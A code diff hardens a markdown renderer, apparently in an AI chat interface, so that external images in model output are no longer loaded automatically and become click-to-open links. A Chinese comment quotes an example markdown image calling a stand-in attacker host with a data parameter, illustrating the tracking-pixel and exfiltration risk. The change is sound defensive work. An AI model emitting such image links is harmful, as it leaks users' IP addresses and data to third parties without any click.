@@ -147,17 +147,29 @@ const defaultComponents = memoizeMarkdownComponents({
       rel="noopener noreferrer"
     />
   ),
-  img: ({ className, alt, ...props }) => (
-    <img
-      alt={alt ?? ""}
-      className={cn("aui-md-img h-auto max-w-full", className)}
-      {...props}
-      // 模型输出的图片是第三方外链：不带 Referer 过去（避免泄露本地会话地址），
-      // 且懒加载，不做可被当作追踪像素的即时请求。
-      loading="lazy"
-      referrerPolicy="no-referrer"
-    />
-  ),
+  // 模型输出的图片是第三方外链：**不自动加载**，否则一个
+  // `![](https://attacker/?d=...)` 就是追踪像素（泄露 IP + 阅读回执），
+  // 而且不需要用户点击就能建立连接（L-02）。
+  // 改成「点击后在新标签页打开」：需要看图的人自己决定，Referer 仍不带。
+  img: ({ className, alt, src }) => {
+    if (typeof src !== "string" || !/^https?:\/\//i.test(src)) {
+      return alt ? <span className="text-muted-foreground">{alt}</span> : null;
+    }
+    return (
+      <a
+        className={cn(
+          "aui-md-img-link text-primary hover:text-primary/80 inline-flex items-center gap-1 text-sm underline underline-offset-2",
+          className,
+        )}
+        href={src}
+        target="_blank"
+        rel="noopener noreferrer"
+        title="外部图片不会自动加载，点击在新标签页打开"
+      >
+        🖼 {alt || "外部图片"}（点击打开）
+      </a>
+    );
+  },
   blockquote: ({ className, ...props }) => (
     <blockquote
       className={cn(
